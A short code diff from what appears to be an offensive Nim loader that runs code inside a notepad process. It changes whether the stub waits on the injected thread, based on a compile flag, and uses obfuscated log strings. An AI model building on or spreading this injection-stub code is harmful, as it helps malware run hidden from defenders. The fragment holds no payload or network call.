@@ -3712,7 +3712,8 @@ let NotepadProcIDStub * = fmt"""
                 # resume main thread for execution
                 ResumeThread(treadHandle)
                 # Wait for the thread to finish
-                WaitForSingleObject(treadHandle, INFINITE)
+                when not defined(mutexoneshot):
+                    WaitForSingleObject(treadHandle, INFINITE)
                 when defined(verbose):
                     echo obf("[*] Quit main process...")
                 quit(1)
